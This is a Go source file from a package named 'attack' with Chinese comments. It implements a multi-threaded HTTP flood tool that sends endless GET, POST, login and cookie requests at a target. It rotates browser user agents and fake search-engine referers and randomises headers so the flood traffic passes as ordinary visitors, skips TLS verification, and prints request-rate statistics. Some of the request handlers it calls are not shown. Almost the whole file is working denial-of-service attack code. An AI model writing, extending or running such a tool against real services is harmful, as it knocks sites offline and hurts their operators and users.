// http.go
package attack

import (
	"context"
	cryptoRand "crypto/rand"
	"crypto/tls"
	"fmt"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

// 初始化随机数生成器
func init() {
	// 为 math/rand 设置种子
	rand.Seed(time.Now().UnixNano())
}

type HTTP struct {
	Method  string
	Target  string
	Path    string
	Threads int
	Payload string // 用于POST请求的负载

	// 下面字段由攻击函数设置
	userAgents    []string
	referers      []string
	sentRequests  int64
	recvResponses int64
	sentBytes     int64
	recvBytes     int64
	connErrors    int64
	startTime     time.Time // 新增开始时间字段

}

type httpMethod func(h *HTTP) error

var HTTPMethods = map[string]httpMethod{
	"GET":        (*HTTP).httpGet,
	"POST":       (*HTTP).httpPost,
	"LOGIN":      (*HTTP).httpPost,
	"COOKIE":     (*HTTP).httpCookie,
	"DEEPSEEK_2": (*HTTP).httpPost,
}

func (h *HTTP) HTTPStart() {
	method, exists := HTTPMethods[h.Method]
	if !exists {
		fmt.Printf("不支持的HTTP攻击方法: %s\n", h.Method)
		return
	}

	h.startTime = time.Now()

	h.userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.56",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.21",
	}
	h.referers = []string{
		"https://www.google.com/search?q=",
		"https://www.facebook.com/l.php?u=",
		"https://www.bing.com/search?q=",
		"https://twitter.com/search?q=",
		"https://www.linkedin.com/search/results/all/?keywords=",
		"https://www.pinterest.com/search/pins/?q=",
		"https://www.youtube.com/results?search_query=",
		"https://www.instagram.com/explore/tags/",
		"https://www.reddit.com/search/?q=",
	}

	h.floodAttack(method)
	h.printSummary()
}

func (h *HTTP) floodAttack(attackVector httpMethod) {
	var wg sync.WaitGroup
	fmt.Printf("[+] %s 攻击已启动\n线程数: %d\n", h.Method, h.Threads)

	for i := 0; i < h.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-STOP:
					fmt.Println("HTTP攻击终止")
					return
				default:
					if err := attackVector(h); err != nil {
						atomic.AddInt64(&h.connErrors, 1)
						// 避免日志过多，只记录部分错误
						if h.connErrors%100 == 0 {
							fmt.Printf("HTTP攻击错误: %v (错误计数: %d)\n", err, h.connErrors)
						}
						// 遇到错误时，短暂等待后重试，避免过度消耗资源
						time.Sleep(1 * time.Millisecond)
					}
					time.Sleep(10 * time.Millisecond)
				}
			}
		}()
	}
	wg.Wait()
}

func (h *HTTP) printSummary() {
	endTime := time.Now()
	duration := endTime.Sub(h.startTime)

	// 计算每秒请求数
	requestsPerSecond := float64(0)
	if duration.Seconds() > 0 {
		requestsPerSecond = float64(atomic.LoadInt64(&h.sentRequests)) / duration.Seconds()
	}

	fmt.Printf("\n--- 攻击统计 ---\n")
	fmt.Printf("开始时间: %s\n", h.startTime.Format("2006/01/02 15:04:05"))
	fmt.Printf("结束时间: %s\n", endTime.Format("2006/01/02 15:04:05"))
	fmt.Printf("攻击持续时间: %s\n", formatDuration(duration))
	fmt.Printf("发送请求: %d (%.2f 请求/秒)\n",
		atomic.LoadInt64(&h.sentRequests),
		requestsPerSecond)
	fmt.Printf("接收响应: %d\n",
		atomic.LoadInt64(&h.recvResponses))
	fmt.Printf("发送数据: %.2f MB, 接收数据: %.2f MB\n",
		float64(atomic.LoadInt64(&h.sentBytes))/(1024*1024),
		float64(atomic.LoadInt64(&h.recvBytes))/(1024*1024))
	fmt.Printf("连接错误: %d\n",
		atomic.LoadInt64(&h.connErrors))
}

func formatDuration(d time.Duration) string {
	hours := int(d.Hours())
	minutes := int(d.Minutes()) % 60
	seconds := int(d.Seconds()) % 60

	if hours > 0 {
		return fmt.Sprintf("%d小时%d分%d秒", hours, minutes, seconds)
	} else if minutes > 0 {
		return fmt.Sprintf("%d分%d秒", minutes, seconds)
	} else {
		return fmt.Sprintf("%d秒", seconds)
	}
}

func parseURL(target string) (*url.URL, error) {
	parsedURL, err := url.Parse(target)
	if err != nil {
		return nil, err
	}

	if parsedURL.Scheme == "" {
		parsedURL.Scheme = "https"
	}

	// 添加端口号（如果没有）
	if parsedURL.Port() == "" {
		switch parsedURL.Scheme {
		case "http":
			parsedURL.Host += ":80"
		case "https":
			parsedURL.Host += ":443"
		default:
			return nil, fmt.Errorf("不支持的协议: %s", parsedURL.Scheme)
		}
	}

	return parsedURL, nil
}

func (h *HTTP) newClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				d := net.Dialer{Timeout: 5 * time.Second}
				return d.DialContext(ctx, network, addr)
			},
			MaxIdleConns:       1000,
			IdleConnTimeout:    60 * time.Second,
			DisableCompression: true,
		},
		Timeout: 60 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// 不跟随重定向，直接返回响应
			return http.ErrUseLastResponse
		},
	}
}

func (h *HTTP) generateHeaders() map[string]string {
	headers := map[string]string{
		"User-Agent":      h.userAgents[rand.Intn(len(h.userAgents))],
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Accept-Encoding": "gzip, deflate, br",
		"Connection":      "keep-alive",
		"Cache-Control":   "no-cache",
		"Pragma":          "no-cache",
	}

	// 50%概率添加Referer头
	if rand.Intn(2) == 0 {
		headers["Referer"] = h.referers[rand.Intn(len(h.referers))] + h.Target
	}

	// 添加一些常见的API请求头 (30%概率)
	if rand.Intn(10) < 3 {
		headers["X-Requested-With"] = "XMLHttpRequest"
		origin := ""
		targetURL, err := url.Parse(h.Target)
		if err == nil {
			origin = targetURL.Scheme + "://" + targetURL.Host
		}
		headers["Origin"] = origin
	}

	// 20%概率添加Content-Type头
	if rand.Intn(5) == 0 {
		contentTypes := []string{
			"application/json",
			"application/x-www-form-urlencoded",
			"multipart/form-data",
			"text/plain",
			"application/xml",
		}
		headers["Content-Type"] = contentTypes[rand.Intn(len(contentTypes))]
	}

	return headers
}

// 生成指定长度的随机字符串
func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		n, _ := cryptoRand.Int(cryptoRand.Reader, big.NewInt(int64(len(charset))))
		result[i] = charset[n.Int64()]
	}
	return string(result)
}
